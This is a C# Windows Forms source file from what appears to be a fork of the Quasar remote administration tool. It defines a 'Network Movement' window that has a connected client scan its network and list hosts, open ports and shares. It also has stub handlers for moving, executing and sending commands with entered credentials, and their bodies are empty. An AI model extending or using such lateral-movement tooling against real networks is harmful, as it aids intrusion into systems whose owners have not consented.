using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Network;
using Quasar.Common.Models.Network;
// Custom
using Quasar.Common.Models;
using Quasar.Server.Controls;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;

using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Linq;

namespace Quasar.Server.Forms
{
    public partial class FrmNetworkMovement : Form
    {
        /// <summary>
        /// The client which can be used for the network movement.
        /// </summary>
        private readonly Client _connectClient;

        private readonly NetworkHandler _networkHandler;

        private InterfaceEntity[] interfaces;

        /// <summary>
        /// Holds the opened network movement form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmNetworkMovement> OpenedForms = new Dictionary<Client, FrmNetworkMovement>();

        /// <summary>
        /// Creates a new network movement form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the network movement form.</param>
        /// <returns>
        /// Returns a new network movement form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmNetworkMovement CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmNetworkMovement f = new FrmNetworkMovement(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmNetworkMovement(Client client)
        {
            _connectClient = client;
            _networkHandler = new NetworkHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _networkHandler.NetworkScanResponseEvent += NetworkEntitiesChanged;
            _networkHandler.InterfaceScanResponseEvent += InterfaceEntitiesChanged;
            MessageHandler.Register(_networkHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_networkHandler);
            _networkHandler.InterfaceScanResponseEvent -= InterfaceEntitiesChanged;
            _networkHandler.NetworkScanResponseEvent -= NetworkEntitiesChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void NetworkEntitiesChanged(object sender, NetworkScanResponseEventArgs args)
        {
            IEnumerable<ListViewItem> entities = lstNetworkEntities.Items.Cast<ListViewItem>().Where(item => item.SubItems.Count > 2 && item.SubItems[1].Text == args.Packet.Address.Address.ToString());
            if (entities.Count() > 0)
            {
                ListViewItem existingEntity = entities.ToArray()[0];
                if (lstNetworkEntities.InvokeRequired)
                {
                    lstNetworkEntities.Invoke((MethodInvoker)delegate
                    {
                        int index = lstNetworkEntities.Items.IndexOf(existingEntity);
                        lstNetworkEntities.Items[index].Text = args.Packet.Interface.Name;
                        lstNetworkEntities.Items[index].SubItems[2].Text = string.Join(", ", args.Packet.Address.Ports);
                        lstNetworkEntities.Items[index].SubItems[3].Text = string.Join(", ", args.Packet.Address.Shares);
                    });
                }
                else
                {
                    int index = lstNetworkEntities.Items.IndexOf(existingEntity);
                    lstNetworkEntities.Items[index].Text = args.Packet.Interface.Name;
                    lstNetworkEntities.Items[index].SubItems[2].Text = string.Join(", ", args.Packet.Address.Ports);
                    lstNetworkEntities.Items[index].SubItems[3].Text = string.Join(", ", args.Packet.Address.Shares);
                }
            }
            else
            {
                ListViewItem newNetworkEntity = new ListViewItem();
                if (lstNetworkEntities.InvokeRequired)
                {
                    lstNetworkEntities.Invoke((MethodInvoker)delegate
                    {
                        newNetworkEntity.Text = args.Packet.Interface.Name;
                        newNetworkEntity.SubItems.Add(args.Packet.Address.Address.ToString());
                        newNetworkEntity.SubItems.Add(string.Join(", ", args.Packet.Address.Ports));
                        newNetworkEntity.SubItems.Add(string.Join(", ", args.Packet.Address.Shares));
                    });
                }
                else
                {
                    newNetworkEntity.Text = args.Packet.Interface.Name;
                    newNetworkEntity.SubItems.Add(args.Packet.Address.Address.ToString());
                    newNetworkEntity.SubItems.Add(string.Join(", ", args.Packet.Address.Ports));
                    newNetworkEntity.SubItems.Add(string.Join(", ", args.Packet.Address.Shares));
                }
            }
        }

        private void InterfaceEntitiesChanged(object sender, InterfaceScanResponseEventArgs args)
        {
            interfaces = args.Packet.Interfaces;
            if (args.Packet.Interfaces.Length == args.Packet.PotentialIps.Length)
            {
                if (cmbInterfaces.InvokeRequired)
                {
                    cmbInterfaces.BeginInvoke((MethodInvoker)delegate
                    {
                        cmbInterfaces.Items.Clear();
                        for (int i = 0; i < args.Packet.Interfaces.Length; i++)
                        {
                            cmbInterfaces.Items.Add($"{args.Packet.Interfaces[i].Name} ({args.Packet.PotentialIps[i]} IPs)");
                        }
                        cmbInterfaces.Text = cmbInterfaces.Items[0].ToString();
                    });
                }
                else
                {
                    cmbInterfaces.Items.Clear();
                    for (int i = 0; i < args.Packet.Interfaces.Length; i++)
                    {
                        cmbInterfaces.Items.Add($"{args.Packet.Interfaces[i].Name} ({args.Packet.PotentialIps[i]} IPs)");
                    }
                    cmbInterfaces.Text = cmbInterfaces.Items[0].ToString();
                }
            }
            else
            {
                // IP Count mismatch. Default to just interface data
                if (cmbInterfaces.InvokeRequired)
                {
                    cmbInterfaces.BeginInvoke((MethodInvoker)delegate
                    {
                        cmbInterfaces.Items.Clear();
                        foreach (InterfaceEntity nic in args.Packet.Interfaces)
                        {
                            cmbInterfaces.Items.Add($"{nic.Name}");
                        }
                        cmbInterfaces.Text = cmbInterfaces.Items[0].ToString();
                    });
                }
                else
                {
                    cmbInterfaces.Items.Clear();
                    foreach (InterfaceEntity nic in args.Packet.Interfaces)
                    {
                        cmbInterfaces.Items.Add($"{nic.Name}");
                    }
                    cmbInterfaces.Text = cmbInterfaces.Items[0].ToString();
                }
            }
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmNetworkMovement_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Network Movement", _connectClient);
            _networkHandler.RefreshInterfaces();
        }

        private void toolStripMoveItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK &&
                InputBox.Show("Command", "Enter Command:", ref command) == DialogResult.OK)
            {

            }
        }

        private void toolStripExecuteItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK &&
                InputBox.Show("Command", "Enter Command:", ref command) == DialogResult.OK)
            {

            }
        }

        private void toolStripCommandItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK &&
                InputBox.Show("Command", "Enter Command:", ref command) == DialogResult.OK)
            {

            }
        }

        private void toolStripRefreshItem_Click(object sender, EventArgs e)
        {
            lstNetworkEntities.Items.Clear();
            _networkHandler.RefreshInterfaces();
        }

        private void FrmNetworkMovement_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }
    }
}
